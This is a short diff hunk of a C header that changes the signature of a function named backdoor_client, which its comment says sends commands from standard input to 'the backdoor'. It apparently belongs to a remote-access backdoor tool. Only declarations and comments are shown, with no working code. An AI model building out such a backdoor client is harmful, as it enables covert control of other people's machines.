@@ -35,7 +35,7 @@ RETURN: none.
 NOTES: Call this function to start reading commands from standard input
 	and sending them to the backdoor.
 */
-void backdoor_client(uint32 ipaddr, int dport, int duplex);
+void backdoor_client(uint32 ipaddr, int dport);
 /*
 FUNCTION: listen_thread
 
